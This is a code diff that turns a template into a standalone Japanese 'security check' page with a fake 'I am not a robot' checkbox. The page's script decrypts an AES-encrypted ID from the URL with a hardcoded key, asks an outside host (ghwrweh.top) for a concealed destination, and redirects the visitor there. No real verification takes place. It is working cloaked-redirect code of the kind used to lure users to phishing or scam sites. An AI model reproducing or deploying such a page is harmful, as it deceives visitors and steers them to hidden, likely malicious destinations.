@@ -1,92 +1,205 @@
-<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8">
-<title>ページを読み込み中...</title></head>
-<body><h2>ページの確認中に問題が発生しました。</h2>
-<p>しばらくしてからもう一度お試しください。</p></body></html>
-`;
-
-function renderVerifyPage(id) {
-  return `<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
+  <title>セキュリティチェック</title>
   <meta name="robots" content="noindex,nofollow">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>セキュリティチェック</title>
   <style>
-    body { background: #1a1a1a; font-family: sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    .card { background: #fff; border-radius: 12px; width: 460px; padding: 30px; text-align: center; box-shadow: 0 0 20px rgba(0,0,0,0.3); }
-    .top-icon { font-size: 15px; color: #f8b400; margin-bottom: 10px; }
-    h2 { font-size: 18px; font-weight: bold; color: #000; margin: 5px 0; }
-    p.tip { font-size: 13px; color: #555; margin: 10px 0; }
-    .check-box-area { background: #f9f9f9; border: 1px solid #ccc; border-radius: 8px; padding: 15px; margin: 20px 0; text-align: left; position: relative; }
-    .success { color: green; font-size: 14px; display: none; padding-left: 28px; background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMjAi...') no-repeat left center; background-size: 20px; }
-    .loading { border: 2px solid #eee; border-top: 2px solid #888; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-left: 6px; }
-    .bottom-note { font-size: 11px; color: #666; margin-top: 10px; }
-    .row-flex { display: flex; align-items: center; }
-    input[type=checkbox] { width: 20px; height: 20px; margin-right: 10px; cursor: pointer; }
-    label { font-size: 14px; color: #000; cursor: pointer; }
-    .meta-links { display: flex; justify-content: space-between; font-size: 12px; color: #777; margin-top: 10px; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    body {
+      background: #1a1a1a;
+      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      max-width: 500px;
+      padding: 30px 20px;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+    }
+    .icon {
+      font-size: 15px;
+      color: #f5a623;
+      margin-bottom: 10px;
+    }
+    h2 {
+      font-size: 18px;
+      font-weight: bold;
+      color: #000;
+      margin: 5px 0 15px;
+    }
+    p.subtitle {
+      color: #555;
+      font-size: 13px;
+      margin: 0 0 20px;
+    }
+    .box {
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 15px;
+      background: #fafafa;
+      text-align: left;
+      position: relative;
+    }
+    .box-row {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+    .box-row label {
+      cursor: pointer;
+      color: #333;
+    }
+    .error-msg {
+      color: green;
+      font-size: 14px;
+      margin-left: 6px;
+    }
+    .error-icon {
+      color: red;
+      margin-right: 4px;
+    }
+    .verify-success {
+      color: green;
+      font-size: 14px;
+      display: none;
+    }
+    .loading {
+      display: inline-block;
+      width: 14px;
+      height: 14px;
+      border: 2px solid #eee;
+      border-top: 2px solid #888;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+    .links {
+      font-size: 12px;
+      color: #999;
+      display: flex;
+      justify-content: space-between;
+      margin-top: 10px;
+    }
+    .footer {
+      font-size: 11px;
+      color: #999;
+      margin-top: 20px;
+    }
+    input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      margin-right: 8px;
+      appearance: none;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      vertical-align: middle;
+      background-color: white;
+    }
+    input[type="checkbox"]:checked::before {
+      content: "✓";
+      display: block;
+      text-align: center;
+      color: white;
+      background-color: #00c853;
+      border-radius: 3px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="top-icon">🛡️ セキュリティチェック</div>
+  <div class="container">
+    <div class="icon">🛡️ <span style="color:#f5a623;">セキュリティチェック</span></div>
     <h2>ロボットではないことを確認してください</h2>
-    <p class="tip">自動化された攻撃からサービスを保護するため、以下の確認を行ってください</p>
-    <div class="check-box-area">
-      <div id="success" class="success"> 検証が完了しました。しばらくお待ちください。<span class="loading"></span></div>
-      <div id="box" class="row-flex">
-        <input type="checkbox" id="check">
-        <label for="check">私はロボットではありません</label>
+    <p class="subtitle">自動化された攻撃からサービスを保護するため、以下の確認を行ってください</p>
+
+    <div class="box">
+      <div id="error" style="display:none;" class="box-row">
+        <span class="error-icon">❌</span>
+        <span class="error-msg">取得中にエラーが発生しました。</span>
       </div>
-      <div class="meta-links">
-        <span>✅ セキュリティ確認</span><span>プライバシー・利用規約</span>
+
+      <div id="verify-box" class="box-row">
+        <input type="checkbox" id="check">
+        <label for="check">セキュリティ確認</label>
+      </div>
+
+      <div id="success-msg" class="verify-success">
+        ✅ 検証に成功しました。リダイレクト中... <span class="loading"></span>
+      </div>
+
+      <div class="links">
+        <span>✅ セキュリティ確認</span>
+        <span>プライバシー・利用規約</span>
       </div>
     </div>
-    <div class="bottom-note">この確認は不正なアクセスからサービスを守るためのものです</div>
+
+    <div class="footer">この確認は不正なアクセスからサービスを守るためのものです</div>
   </div>
+
   <script>
-    document.getElementById("check").addEventListener("change", function() {
+    const AES_KEY = "5Ctianyoumabiiii";
+    const path = location.pathname.split("/").filter(Boolean);
+    const encryptedId = path[path.length - 1];
+
+    document.getElementById("check").addEventListener("change", async function () {
+      const errorBox = document.getElementById("error");
+      const successBox = document.getElementById("success-msg");
+      const verifyBox = document.getElementById("verify-box");
+
+      errorBox.style.display = "none";
+
       if (this.checked) {
-        document.getElementById("box").style.display = "none";
-        const msg = document.getElementById("success");
-        msg.style.display = "block";
-        setTimeout(() => {
-          fetch('/get_url?id=' + encodeURIComponent(${JSON.stringify(id)}))
-            .then(res => res.json())
-            .then(d => {
-              if (d.enc) decryptAES(d.enc).then(url => location.href = url);
-              else msg.innerText = "❌ リダイレクト先が取得できませんでした。";
-            })
-            .catch(() => {
-              msg.innerText = "❌ 取得中にエラーが発生しました。";
-            });
-        }, 1500);
+        verifyBox.style.display = "none";
+        successBox.style.display = "block";
+
+        const id = await decryptAES(encryptedId);
+        if (!id) {
+          successBox.style.display = "none";
+          errorBox.style.display = "flex";
+          return;
+        }
+
+        try {
+          const res = await fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id));
+          const json = await res.json();
+          const url = json?.data?.siteUrl;
+          if (!url) throw new Error("No URL");
+          setTimeout(() => {
+            location.href = url;
+          }, 2000);
+        } catch {
+          successBox.style.display = "none";
+          errorBox.style.display = "flex";
+        }
       }
     });
 
-    async function decryptAES(enc) {
-      const base64 = enc.replace(/-/g, '+').replace(/_/g, '/');
-      const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
-      const iv = bytes.slice(0, 16);
-      const data = bytes.slice(16);
-      const key = await crypto.subtle.importKey("raw", new TextEncoder().encode("${AES_KEY}"), { name: "AES-CBC" }, false, ["decrypt"]);
-      const decrypted = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, key, data);
-      return new TextDecoder().decode(decrypted).replace(/\\u0000+$/, '');
+    async function decryptAES(encText) {
+      try {
+        const b64 = encText.replace(/-/g, '+').replace(/_/g, '/');
+        const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+        const iv = bytes.slice(0, 16);
+        const data = bytes.slice(16);
+        const key = await crypto.subtle.importKey("raw",
+          new TextEncoder().encode(AES_KEY), { name: "AES-CBC" }, false, ["decrypt"]);
+        const dec = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, key, data);
+        return new TextDecoder().decode(dec).replace(/\u0000+$/, "");
+      } catch {
+        return null;
+      }
     }
   </script>
 </body>
-</html>`;
-}
-
-async function encryptAES(plaintext) {
-  const iv = crypto.getRandomValues(new Uint8Array(16));
-  const keyBytes = new TextEncoder().encode(AES_KEY);
-  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-CBC" }, false, ["encrypt"]);
-  const data = new TextEncoder().encode(plaintext);
-  const encryptedBuffer = await crypto.subtle.encrypt({ name: "AES-CBC", iv }, cryptoKey, data);
-  const fullData = new Uint8Array([...iv, ...new Uint8Array(encryptedBuffer)]);
-  const base64 = btoa(String.fromCharCode(...fullData));
-  return base64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
-}
+</html>
